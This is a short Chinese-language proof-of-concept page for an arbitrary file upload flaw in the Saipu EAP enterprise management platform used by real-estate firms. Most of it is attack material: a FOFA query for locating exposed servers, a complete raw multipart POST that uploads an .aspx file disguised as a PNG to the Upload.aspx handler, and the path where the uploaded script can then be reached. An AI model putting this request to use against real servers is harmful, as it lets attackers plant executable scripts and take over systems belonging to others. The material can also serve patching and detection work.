# 赛普EAP企业适配管理平台Upload存在任意文件上传漏洞
赛普EAP企业适配管理平台，是一款专门为房地产企业打造的数字化管理系统，旨在帮助企业实现业务流程的优化、管理效率的提升和客户体验的改善。系统集成了项目管理、销售管理、客户关系管理、财务管理、报表分析等多个模块，能够满足企业不同层级、不同部门的管理需求。通过采用灵活的配置机制，该系统可以根据不同企业的需求进行定制化配置，实现与企业业务的完美契合。赛普EAP企业适配管理平台Upload存在任意文件上传漏洞

## fofa
```javascript
body="IDWebSoft/"
```

## poc
```java
POST /IDWebSoft/Common/Handler/Upload.aspx HTTP/1.1
Host: 
Accept-Encoding: gzip, deflate
Priority: u=0
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:132.0) Gecko/20100101 Firefox/132.0
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Content-Type: multipart/form-data; boundary=---------------------------328367279028471380642525145085
Accept: */*
Content-Length: 44892

-----------------------------328367279028471380642525145085
Content-Disposition: form-data; name="Filedata"; filename="1.aspx"
Content-Type: image/png

<% response.write("drwc2nymcirgr7r2bdgb111")%>
-----------------------------328367279028471380642525145085--
```

![](https://cdn.nlark.com/yuque/0/2024/png/29512878/1731434585150-3f3a308b-bfc8-477d-9e09-0b93e43169dc.png)

```java
/IDWebSoft/Accessary/2024/11/cf9ebf1f-04f9-47f7-b2a3-aa22f74cf825.aspx
```

![](https://cdn.nlark.com/yuque/0/2024/png/29512878/1731434601172-28e5ec47-8721-41eb-9010-76dce5d3d1a8.png)

